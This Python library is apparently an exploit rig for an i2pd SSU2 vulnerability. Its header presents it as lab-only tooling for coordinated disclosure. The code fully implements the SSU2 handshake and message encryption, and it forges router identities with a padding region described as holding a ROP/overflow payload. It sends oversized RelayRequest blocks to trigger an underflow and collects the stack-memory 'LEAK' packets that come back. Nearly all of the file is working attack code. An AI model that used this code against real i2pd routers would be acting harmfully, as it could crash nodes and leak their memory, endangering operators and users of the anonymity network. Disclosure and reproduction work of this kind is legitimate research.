#!/usr/bin/env python3
"""
ssu2lib.py — i2pd SSU2 attack-side protocol library (audit reproduction rig).

DISCLOSURE / SCOPE: This library implements the i2pd SSU2 wire protocol for the
sole purpose of reproducing VULN-01 against a LOCAL LABORATORY target
(45.45.45.1 inside an unshare -Urn network namespace on the maintainer's own
machine), as required for coordinated vulnerability disclosure evidence.
It contains NO scanning, targeting or weaponization capability against public
hosts. All addresses are loopback lab addresses.

Reconstructed from PurpleI2P/i2pd 2.61.0 source (audit reference), matching:
  SSU2Session.cpp (handshake/data/relay), Crypto.cpp (Noise XK / HKDF / AEAD),
  RouterInfo.cpp (RI format), Identity.cpp (Ed25519 identity), NetDb.cpp.
"""
import os, io, sys, socket, struct, time, hashlib, hmac, zlib, random, secrets
from cryptography.hazmat.primitives.asymmetric import x25519, ed25519
from cryptography.hazmat.primitives import serialization
from Crypto.Cipher import ChaCha20, ChaCha20_Poly1305

# ----------------------------------------------------------------------------
# lab constants
BOB_IP   = "45.45.45.1"; BOB_PORT = 17777
EVIL_IP  = "45.45.45.2"
ALICE_PORT, CHARLIE_PORT = 20001, 20002
MAX_PAYLOAD = 1440          # m_MaxPayloadSize for mtu 1500 v4 (1500-20-8-32)
SSU2_MAX_PACKET = 1500

# message types
T_SESSREQ, T_SESSCREATED, T_SESSCONF = 0, 1, 2
T_DATA, T_PEERTEST, T_RETRY, T_TOKENREQ = 6, 7, 9, 10
# block types
B_DATETIME, B_OPTIONS, B_ROUTERINFO = 0, 1, 2
B_I2NP, B_FIRSTFRAG, B_FOLLOWON = 3, 4, 5
B_TERMINATION, B_RELAYREQ, B_RELAYRESP, B_RELAYINTRO = 6, 7, 8, 9
B_PEERTEST, B_NEXTNONCE, B_ACK, B_ADDRESS = 10, 11, 12, 13
B_INTROKEY, B_RELAYTAGREQ, B_RELAYTAG, B_NEWTOKEN = 14, 15, 16, 17
B_PATHCHALLENGE, B_PATHRESPONSE, B_FIRSTPKTNUM, B_PADDING = 18, 19, 20, 254

def log(tag, msg): print("[%s] %s" % (tag, msg), flush=True)

# ----------------------------------------------------------------------------
# primitives
def sha256(b): return hashlib.sha256(b).digest()

def i2p_hkdf(salt32, key, info, out_len):
    """i2p::crypto::HKDF — two forms (Crypto.cpp:779-802).
    CRITICAL: i2pd caps the HMAC key (salt) at 32 BYTES in both forms
    (HMAC(EVP_sha256(), salt, 32, ...) / set1_hkdf_salt(..., 32))."""
    if key is not None and len(key) > 0:
        prk = hmac.new(salt32[:32], key, hashlib.sha256).digest()   # extract+expand
    else:
        prk = hmac.new(salt32[:32], b"", hashlib.sha256).digest()   # expand-only
    t, okm, i = b"", b"", 1
    while len(okm) < out_len:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t; i += 1
    return okm[:out_len]

def chacha20_i2p(data, key32, nonce12):
    """i2pd ChaCha20: iv = LE32(1) || nonce12 (Crypto.cpp:745). counter starts at 1."""
    c = ChaCha20.new(key=key32, nonce=nonce12)
    c.seek(64)  # skip block 0 → counter 1
    return c.encrypt(data)

def hdr_mask(key32, nonce12):
    return chacha20_i2p(b"\x00" * 8, key32, nonce12)      # 8 bytes

def aead_enc(msg, ad, key32, nonce12):
    c = ChaCha20_Poly1305.new(key=key32, nonce=nonce12); c.update(ad)
    return c.encrypt(msg) + c.digest()

def aead_dec(ct, ad, key32, nonce12):
    if len(ct) < 16: raise ValueError("aead ct too short")
    c = ChaCha20_Poly1305.new(key=key32, nonce=nonce12); c.update(ad)
    return c.decrypt_and_verify(ct[:-16], ct[-16:])

def make_nonce(seq):
    return b"\x00" * 12 if seq == 0 else b"\x00" * 4 + struct.pack("<Q", seq)

def x25519_gen():
    k = x25519.X25519PrivateKey.generate()
    return k, k.public_key().public_bytes(serialization.Encoding.Raw,
                                          serialization.PublicFormat.Raw)

def x25519_agree(priv, peer_pub32):
    return priv.exchange(x25519.X25519PublicKey.from_public_bytes(peer_pub32))

def ed25519_gen():
    k = ed25519.Ed25519PrivateKey.generate()
    return k, k.public_key().public_bytes(serialization.Encoding.Raw,
                                          serialization.PublicFormat.Raw)

def i2p_b64(b):
    """i2pd reads RI 's'/'i' with the I2P base64 alphabet (-~ instead of +/)."""
    import base64
    return base64.b64encode(b).decode().translate(str.maketrans("+/", "-~"))

def gzip_bytes(b):
    co = zlib.compressobj(9, zlib.DEFLATED, 31)
    return co.compress(b) + co.flush()

def gunzip_bytes(b):
    return zlib.decompress(b, 31)

# ----------------------------------------------------------------------------
# Noise XK (SSU2) — Crypto.cpp:806-917
class Noise:
    PROTO = bytes.fromhex(
        "b13722817423a8fdf42df2e60ed1edf41b93071db1ec24a367f784ec270d8132")
    HH    = bytes.fromhex(
        "dc85e6af7b02650cf1f90d71fbc6d453a7cf6dbfbd525ea5b5791c47b35ebc33")

    def __init__(self, bob_static_pub32):
        self.ck = self.PROTO
        self.h = sha256(self.HH + bob_static_pub32)
        self.k = b"\x00" * 32
        self.n = 0

    def mixhash(self, *chunks):
        h = self.h
        for c in chunks:
            h = sha256(h + c)
        self.h = h

    def mixkey(self, ikm32):
        okm = i2p_hkdf(self.ck, ikm32, b"", 64)
        self.ck, self.k = okm[:32], okm[32:]
        self.n = 0

    def encrypt(self, pt):     # out = pt||tag16, AD = h
        out = aead_enc(pt, self.h, self.k, make_nonce(self.n)); self.n += 1
        return out

    def decrypt(self, ct):
        pt = aead_dec(ct, self.h, self.k, make_nonce(self.n)); self.n += 1
        return pt

# ----------------------------------------------------------------------------
# blocks
def blk(t, content):
    return bytes([t]) + struct.pack(">H", len(content)) + content

def blk_datetime(ts_s=None):
    if ts_s is None: ts_s = int(time.time())
    return blk(B_DATETIME, struct.pack(">I", ts_s))

def blk_padding(n):
    return blk(B_PADDING, b"\x00" * n)

def blk_ack(ack_through, acnt, ranges=()):
    """Ack block. acnt acks [ack_through-acnt .. ack_through]; ranges are
    (nacks, acks) pairs walking downward (HandleAck 2005-2024)."""
    body = struct.pack(">IB", ack_through, acnt)
    for nacks, acks in ranges:
        body += bytes([nacks, acks])
    return blk(B_ACK, body)

def blk_relay_request(nonce, tag, total_len):
    """RelayRequest content: flag(1) + nonce(4BE) + relayTag(4BE) + filler
    (HandleRelayRequest reads nonce at buf+1, tag at buf+5).
    total_len > MAX_PAYLOAD-32 (1408) triggers the VULN-01 underflow."""
    if total_len < 9: raise ValueError("relay request too short")
    return blk(B_RELAYREQ, b"\x00" + struct.pack(">II", nonce, tag) +
               b"\x00" * (total_len - 9))

def blk_relay_tag_request():
    return blk(B_RELAYTAGREQ, b"")

def blk_routerinfo_gzip(ri):
    """Data-phase RI delivery, gzip form (HandleRouterInfo 1965+)."""
    return blk(B_ROUTERINFO, b"\x02\x01" + gzip_bytes(ri))

def parse_blocks(buf):
    out, off = [], 0
    while off + 3 <= len(buf):
        t = buf[off]; sz = struct.unpack(">H", buf[off+1:off+3])[0]; off += 3
        if off + sz > len(buf): break
        out.append((t, buf[off:off+sz])); off += sz
    return out

# ----------------------------------------------------------------------------
# RouterInfo construction / parsing (RouterInfo.cpp:205-511, Identity.cpp)
# identity: pad256 || pad96 || ed25519pub32 || cert(6, len=4) || sigtype7 || crypto0 → 391 bytes
IDENT_LEN = 391

class NodeIdentity:
    """Ed25519 router identity with fully controlled padding (352 bytes).
    X25519 static key regenerated until s[31] high bit clear (RouterInfo.cpp:286)."""
    def __init__(self, pad352=None):
        self.ed_priv, self.ed_pub = ed25519_gen()
        for _ in range(64):
            self.st_priv, self.st_pub = x25519_gen()   # static X25519 (RI 's')
            if not (self.st_pub[31] & 0x80):
                break
        self.ikey = secrets.token_bytes(32)        # intro key (RI 'i')
        self.pad = pad352 if pad352 is not None else secrets.token_bytes(352)

    def identity_buf(self):
        # cert type 5 = CERTIFICATE_TYPE_KEY (Identity.h:52) — NOT 6
        return (self.pad[:256] + self.pad[256:352] + self.ed_pub +
                b"\x05" + struct.pack(">HHH", 4, 7, 0))

    def ident_hash(self):
        return sha256(self.identity_buf())

    def sign(self, data):
        return self.ed_priv.sign(data)

def mapping_bytes(pairs):
    """I2P mapping: klen(1) key '=' vlen(1) value ';' (ExtractParam 656)."""
    out = b""
    for k, v in pairs:
        kb, vb = k.encode() if isinstance(k, str) else k, \
                 v.encode() if isinstance(v, str) else v
        out += bytes([len(kb)]) + kb + b"=" + bytes([len(vb)]) + vb + b";"
    return out

def build_ri(ident: NodeIdentity, ts_ms, top_opts, addr_opts, addr_pad=b"",
             extra_addrs=()):
    """Build a signed RouterInfo.
    top_opts/addr_opts: list of (key, value) pairs (ordered!).
    addr_pad: raw bytes appended inside the ssu2 address mapping (controlled
              offsets — 'sig_pad' region used for ROP/overflow payload).
    Layout: ident(391) ts(8) naddr(1) [cost(1) date(8) 'ssu2\\0' size(2) map]
            npeers(1) topsize(2) topmap sig(64)."""
    amap = mapping_bytes(addr_opts) + addr_pad
    addr = (b"\x03" + b"\x00" * 8 + b"\x04SSU2" +      # length-prefixed "SSU2" (ExtractString / WriteString format)
            struct.pack(">H", len(amap)) + amap)
    addrs = addr + b"".join(extra_addrs)
    tmap = mapping_bytes(top_opts)
    body = (ident.identity_buf() + struct.pack(">Q", ts_ms) +
            bytes([1 + len(extra_addrs)]) + addrs + b"\x00" +
            struct.pack(">H", len(tmap)) + tmap)
    return body + ident.sign(body)

def parse_ri(buf):
    """Minimal RI parser (for Bob's router.info and self-verification)."""
    if buf[:2] == b"\x1f\x8b": buf = gunzip_bytes(buf)
    o = {"raw": buf}
    cert_len = struct.unpack(">H", buf[385:387])[0]   # 256+128 pubkey/signing + type(1) + len(2)
    full_ident = 387 + cert_len
    o["ident"] = buf[:full_ident]
    o["ident_hash"] = sha256(buf[:full_ident])
    o["ts"] = struct.unpack(">Q", buf[full_ident:full_ident+8])[0]
    p = full_ident + 8
    n = buf[p]; p += 1
    for _ in range(n):
        p += 1 + 8                      # cost + date
        slen = buf[p]; p += 1            # length-prefixed transport style
        style = buf[p:p+slen]; p += slen
        sz = struct.unpack(">H", buf[p:p+2])[0]; p += 2
        content = buf[p:p+sz]; p += sz
        if style == b"SSU2":
            o["ssu2"] = {}
            q = 0
            while q < len(content):
                kl = content[q]; q += 1
                key = content[q:q+kl]; q += kl
                assert content[q:q+1] == b"=", "mapping '=' expected"
                q += 1
                vl = content[q]; q += 1
                val = content[q:q+vl]; q += vl
                assert content[q:q+1] == b";", "mapping ';' expected"
                q += 1
                o["ssu2"][key.decode()] = val.decode()
    return o

def bob_keys(router_info_path, tries=20):
    """Extract Bob's SSU2 params from his router.info.
    Retries: i2pd saves router.info asynchronously (RouterContext.cpp:278),
    so the file may be observed mid-write."""
    import base64
    def b64d(s):
        # i2p base64 alphabet: '-' '~' instead of '+' '/' (Base64.h)
        s = s.translate(str.maketrans("-~", "+/"))
        return base64.b64decode(s + "=" * (-len(s) % 4))
    last_err = None
    for attempt in range(tries):
        try:
            with open(router_info_path, "rb") as f: raw = f.read()
            time.sleep(0.2)
            with open(router_info_path, "rb") as f: raw2 = f.read()
            if raw != raw2 or len(raw) < 400:
                continue
            ri = parse_ri(raw)
            a = ri["ssu2"]
            ik, sk = b64d(a["i"]), b64d(a["s"])
            if len(ik) == 32 and len(sk) == 32:
                return dict(i=ik, s=sk,
                            host=a.get("host", BOB_IP), port=int(a.get("port", BOB_PORT)),
                            ident=ri["ident"], ident_hash=ri["ident_hash"], raw=raw)
            last_err = "bad key len i=%d s=%d" % (len(ik), len(sk))
        except Exception as e:
            last_err = repr(e)
    raise RuntimeError("bob_keys failed after %d tries: %s" % (tries, last_err))

# ----------------------------------------------------------------------------
# fake floodfill seed (local reseed.zipfile — keeps the lab offline & deterministic)
def make_seed_zip(path, n=6):
    import zipfile
    zf = zipfile.ZipFile(path, "w", zipfile.ZIP_STORED)
    for i in range(n):
        ident = NodeIdentity()
        ri = build_ri(ident, int(time.time() * 1000) - 1000 + i,
                      [("netId", "2"), ("caps", "fP"), ("router.version", "2.61.0")],
                      [("host", "10.99.99.%d" % (10 + i)), ("port", "17777"),
                       ("s", i2p_b64(ident.st_pub)),
                       ("i", i2p_b64(ident.ikey)),
                       ("v", "2"), ("caps", "BC")])
        zf.writestr("routerInfo-%02d.dat" % i, ri)
    zf.close()
    return path

# ----------------------------------------------------------------------------
# peer session (Alice or Charlie role)
class Peer:
    def __init__(self, name, ident: NodeIdentity, src_port, bob):
        self.name = name
        self.ident = ident
        self.bob = bob
        self.x = secrets.randbits(63) | 1     # our word0 connID (Bob's session key)
        self.y = secrets.randbits(63) | 1     # our headerX connID (Bob's word0 to us)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((EVIL_IP, src_port))
        self.sock.settimeout(3.0)
        self.token = 0
        self.eph, self.eph_pub = None, None
        self.noise = None
        self.k_send = self.k_send_hdr = None
        self.k_recv = self.k_recv_hdr = None
        self.pkt_send = 0        # our outgoing packet numbers
        self.pkt_recv = 0
        self.relay_tag = None

    # ---- wire helpers ----
    def _send(self, data):
        self.sock.sendto(data, (self.bob["host"], self.bob["port"]))

    def _mask_hdr(self, hdr, key0, key1):
        """mask word0 with key0 (nonce=tail-24), word1 with key1 (nonce=tail-12)."""
        full = None  # caller provides packet tail via closure: we return post-build
        return hdr

    def _recv(self, timeout=3.0):
        self.sock.settimeout(timeout)
        try:
            data, _ = self.sock.recvfrom(65535)
            return data
        except socket.timeout:
            return None

    # ---- handshake ----
    def _build_session_request(self, relay_tag_req):
        self.eph, self.eph_pub = x25519_gen()
        hdr = struct.pack(">QIB3s", self.x, secrets.randbits(31), T_SESSREQ,
                          bytes([2, 2, 0]))
        hx = struct.pack("<Q", self.y) + struct.pack("<Q", self.token) + self.eph_pub
        payload = blk_datetime()
        if relay_tag_req:
            payload += blk_relay_tag_request()
        payload += blk_padding(16)
        n = Noise(self.bob["s"])
        n.mixhash(hdr + hx[:16])
        n.mixhash(self.eph_pub)
        n.mixkey(x25519_agree(self.eph, self.bob["s"]))
        ct = n.encrypt(payload)                     # payloadSize+16
        n.mixhash(ct)                                # h for SessionCreated (SSU2Session.cpp:813)
        if os.environ.get("SSU2_DUMP"):
            import json
            with open(os.environ["SSU2_DUMP"] + "/state_%d.json" % int(time.time()*1000), "w") as f:
                json.dump(dict(eph_priv=self.eph.private_bytes_raw().hex(),
                               eph_pub=self.eph_pub.hex(), x=self.x, y=self.y,
                               token=self.token, ck=n.ck.hex(), k=n.k.hex(),
                               h=n.h.hex(), h_pre=n.h.hex(), hdr=hdr.hex(), hx=hx.hex(),
                               payload_hex=payload.hex(), ct_hex=ct.hex()), f)
        packet = bytearray(hdr + hx + ct)
        m0 = hdr_mask(self.bob["i"], ct[-24:-12])
        m1 = hdr_mask(self.bob["i"], ct[-12:])
        for i in range(8):
            packet[i] ^= m0[i]; packet[8 + i] ^= m1[i]
        packet[16:64] = chacha20_i2p(bytes(packet[16:64]), self.bob["i"], b"\x00" * 12)
        self.noise = n
        return bytes(packet)

    def handshake(self, ri_bytes, relay_tag_req=False, tries=6):
        """Full establish, verify-driven: Retry → SessionCreated (AEAD-verified
        against current and recent noise states) → SessionConfirmed."""
        self._noise_hist = []
        for attempt in range(tries):
            self._send(self._build_session_request(relay_tag_req))
            self._noise_hist.append((self.noise, self.eph))
            if len(self._noise_hist) > 4: self._noise_hist.pop(0)
            deadline = time.time() + 2.0
            got_sc = False
            while time.time() < deadline:
                pkt = self._recv(0.4)
                if pkt is None: continue
                if self._try_retry(pkt):
                    break
                if self._try_session_created(pkt):
                    self._send_session_confirmed(ri_bytes)
                    return True
            else:
                continue
        raise RuntimeError("%s: handshake failed" % self.name)

    def _try_retry(self, pkt):
        """Retry? word0/word1 both masked with bob intro key; token inside
        chacha20'd h+16. Cryptographically self-verifying via payload AEAD."""
        if len(pkt) < 48: return False
        m0 = hdr_mask(self.bob["i"], pkt[-24:-12])
        raw0 = bytes(a ^ b for a, b in zip(pkt[:8], m0))
        if struct.unpack("<Q", raw0)[0] != self.y: return False
        m1 = hdr_mask(self.bob["i"], pkt[-12:])
        raw1 = bytes(a ^ b for a, b in zip(pkt[8:16], m1))
        if raw1[4] != T_RETRY: return False
        pktNum = struct.unpack(">I", raw1[:4])[0]
        hx16 = chacha20_i2p(pkt[16:32], self.bob["i"], b"\x00" * 12)
        token = struct.unpack("<Q", hx16[8:16])[0]
        h = raw0 + raw1 + hx16
        try:
            aead_dec(pkt[32:], h, self.bob["i"], make_nonce(pktNum))
        except Exception:
            return False
        if not token:
            return False
        self.token = token
        log(self.name, "got retry, token=%016x" % token)
        return True

    def _try_session_created(self, pkt):
        """SessionCreated? Try each candidate noise state; the AEAD MAC of the
        payload is the oracle (no heuristics)."""
        if len(pkt) < 80: return False
        m0 = hdr_mask(self.bob["i"], pkt[-24:-12])
        raw0 = bytes(a ^ b for a, b in zip(pkt[:8], m0))
        if struct.unpack("<Q", raw0)[0] != self.y: return False
        for n0, eph0 in getattr(self, "_noise_hist", [])[-4:]:
            try:
                self._process_session_created(pkt, noise=n0, eph=eph0)
                return True
            except Exception:
                continue
        return False

    def _decode_handshake_type(self, pkt):
        """Unmask word0 (bob intro key). Word1 key differs per message type:
        Retry uses bob's intro key for both words; SessionCreated/SessionConfirmed
        use kh2 (HKDF of noise ck) for word1 — try both, keep the plausible type."""
        if len(pkt) < 32: return None
        m0 = hdr_mask(self.bob["i"], pkt[-24:-12])
        raw0 = bytes(a ^ b for a, b in zip(pkt[:8], m0))
        if struct.unpack("<Q", raw0)[0] != self.y:
            return None
        if os.environ.get("SSU2_DUMP"):
            with open(os.environ["SSU2_DUMP"] + "/pkt_%d.bin" % int(time.time()*1000), "wb") as f:
                f.write(pkt)
        cands = [self.bob["i"]]
        if self.noise is not None:
            cands.append(i2p_hkdf(self.noise.ck, None, b"SessCreateHeader", 32))
            cands.append(i2p_hkdf(self.noise.ck, None, b"SessionConfirmed", 32))
        res = []
        for key in cands:
            m1 = hdr_mask(key, pkt[-12:])
            raw1 = bytes(a ^ b for a, b in zip(pkt[8:16], m1))
            t = raw1[4]
            res.append(t)
            if t in (T_SESSREQ, T_SESSCREATED, T_SESSCONF, T_DATA,
                     T_PEERTEST, T_RETRY, T_TOKENREQ):
                return t
        if os.environ.get("SSU2_DUMP"):
            log(self.name, "decode miss: cands=%s len=%d ck=%s" %
                (res, len(pkt), self.noise.ck.hex() if self.noise else None))
        return res[-1] if res else None

    def _process_retry(self, pkt):
        """Retry: headerX(y, token) chacha20(bob i), payload AEAD(bob i)."""
        hx = chacha20_i2p(pkt[16:64], self.bob["i"], b"\x00" * 12)
        token = struct.unpack("<Q", hx[8:16])[0]
        if not token:
            log(self.name, "retry without token"); return False
        self.token = token
        log(self.name, "got retry, token=%016x" % token)
        return True

    def _process_session_created(self, pkt, noise=None, eph=None):
        import copy
        n = copy.deepcopy(noise if noise is not None else self.noise)
        if eph is None: eph = self.eph
        kh2 = i2p_hkdf(n.ck, None, b"SessCreateHeader", 32)
        hdr = bytearray(pkt[:16])
        m0 = hdr_mask(self.bob["i"], pkt[-24:-12])
        for i in range(8): hdr[i] ^= m0[i]
        m1 = hdr_mask(kh2, pkt[-12:])
        for i in range(8): hdr[8 + i] ^= m1[i]
        hx = chacha20_i2p(pkt[16:64], kh2, b"\x00" * 12)
        n.mixhash(bytes(hdr) + hx[:16])
        n.mixhash(hx[16:48])                       # Bob's ephemeral Yb
        n.mixkey(x25519_agree(eph, hx[16:48]))
        payload = n.decrypt(pkt[64:])
        n.mixhash(pkt[64:])                          # h for SessionConfirmed (SSU2Session.cpp:1107)
        if os.environ.get("SSU2_DUMP"):
            with open(os.environ["SSU2_DUMP"] + "/ck_after_sc_%s.txt" % self.name, "w") as f:
                f.write(n.ck.hex())
        blocks = parse_blocks(payload)
        for t, c in blocks:
            if t == B_RELAYTAG:
                self.relay_tag = struct.unpack(">I", c)[0]
                log(self.name, "relay tag = %08x" % self.relay_tag)
            elif t == B_NEWTOKEN:
                self.token = struct.unpack("<Q", c[4:12])[0]
            elif t == B_ADDRESS:
                pass
        self.yb = hx[16:48]
        self.noise = n          # commit verified state
        self.eph = None         # eph no longer needed
        return True

    def _send_session_confirmed(self, ri_bytes):
        n = self.noise
        kh2 = i2p_hkdf(n.ck, None, b"SessionConfirmed", 32)
        hdr = struct.pack(">QIB3s", self.x, 0, T_SESSCONF, bytes([1, 0, 0]))
        # RI block inside SessionConfirmed: type 2, size = 2 + riSize (flag+frag+ri)
        payload = (bytes([B_ROUTERINFO]) + struct.pack(">H", len(ri_bytes) + 2) +
                   b"\x00\x01" + ri_bytes)
        payload += blk_padding(max(0, 16 - (len(payload) % 16)))
        n.mixhash(hdr)
        part1 = n.encrypt(self.ident.st_pub)                # 48 bytes
        n.mixhash(part1)                                    # SSU2Session.cpp:1153
        n.mixkey(x25519_agree(self.ident.st_priv, self.yb)) # static-static
        ct = n.encrypt(payload)
        n.mixhash(ct)
        packet = bytearray(hdr + part1 + ct)
        m0 = hdr_mask(self.bob["i"], ct[-24:-12])
        m1 = hdr_mask(kh2, ct[-12:])
        for i in range(8):
            packet[i] ^= m0[i]; packet[8 + i] ^= m1[i]
        self._send(bytes(packet))
        self.pkt_send = 1
        # data phase keys AFTER the static-static mixkey (SSU2Session.cpp:1113-1114)
        keydata = i2p_hkdf(n.ck, None, b"", 64)
        ab = i2p_hkdf(keydata, None, b"HKDFSSU2DataKeys", 64)
        ba = i2p_hkdf(keydata[32:], None, b"HKDFSSU2DataKeys", 64)
        self.k_send, self.k_send_hdr = ab[:32], ab[32:]
        self.k_recv, self.k_recv_hdr = ba[:32], ba[32:]
        if os.environ.get("SSU2_DUMP"):
            with open(os.environ["SSU2_DUMP"] + "/ck_after_static_%s.txt" % self.name, "w") as f:
                f.write(n.ck.hex())
            with open(os.environ["SSU2_DUMP"] + "/stpriv_%s.txt" % self.name, "w") as f:
                f.write(self.ident.st_priv.private_bytes_raw().hex())

    # ---- data phase ----
    def send_data(self, blocks, flags=0):
        payload = b"".join(blocks)
        num = self.pkt_send; self.pkt_send += 1
        hdr = struct.pack(">QIB3s", self.x, num, T_DATA,
                          bytes([flags, 0, 0]))
        nonce = make_nonce(num)
        ct = aead_enc(payload, hdr, self.k_send, nonce)
        packet = bytearray(hdr + ct)
        # word0 mask key = RECEIVER's (Bob's) intro key for packets we send
        m0 = hdr_mask(self.bob["i"], ct[-24:-12])
        m1 = hdr_mask(self.k_send_hdr, ct[-12:])
        for i in range(8):
            packet[i] ^= m0[i]; packet[8 + i] ^= m1[i]
        if os.environ.get("SSU2_DUMP"):
            import json
            with open(os.environ["SSU2_DUMP"] + "/data_%s_%d.bin" % (self.name, num), "wb") as f:
                f.write(bytes(packet))
            with open(os.environ["SSU2_DUMP"] + "/datakeys_%s.json" % self.name, "w") as f:
                json.dump(dict(k_send=self.k_send.hex(), k_send_hdr=self.k_send_hdr.hex(),
                               k_recv=self.k_recv.hex(), x=self.x, y=self.y,
                               ikey=self.ident.ikey.hex()), f)
        self._send(bytes(packet))
        return num

    def recv_data(self, timeout=3.0, leak=False):
        """Receive+decrypt one Bob data packet. Returns (pkt_num, blocks) or
        ('LEAK', raw_payload_bytes) for oversized leak packets."""
        pkt = self._recv(timeout)
        if pkt is None: return None
        if len(pkt) < 32: return None
        # header word0 must demask to our y (mask key = OUR intro key)
        m0 = hdr_mask(self.ident.ikey, pkt[-24:-12])
        raw0 = bytes(a ^ b for a, b in zip(pkt[:8], m0))
        if struct.unpack("<Q", raw0)[0] != self.y:
            return ("OTHER", pkt)
        m1 = hdr_mask(self.k_recv_hdr, pkt[-12:])
        raw1 = bytes(a ^ b for a, b in zip(pkt[8:16], m1))
        num = struct.unpack(">I", raw1[:4])[0]
        if leak or len(pkt) - 32 > SSU2_MAX_PACKET:
            # SendData sent stale stack of len+16: header(16) + payloadSize+16
            return ("LEAK", pkt[16:])
        plain = aead_dec(pkt[16:], raw0 + raw1, self.k_recv, make_nonce(num))
        if num > self.pkt_recv:
            self.pkt_recv = num
        return (num, parse_blocks(plain))

    def ack(self, through, acnt=0, ranges=()):
        self.send_data([blk_datetime(), blk_ack(through, acnt, ranges)])

    # ---- relay / attack helpers ----
    def deliver_ri(self, ri_bytes):
        """Data-phase RI update via gzip RouterInfo block (HandleRouterInfo)."""
        return self.send_data([blk_datetime(), blk_routerinfo_gzip(ri_bytes)])

    def fire_relay_request(self, tag, nonce, content_len):
        """Trigger VULN-01: RelayRequest block with content_len > 1408."""
        return self.send_data([blk_datetime(),
                               blk_relay_request(nonce, tag, content_len)])
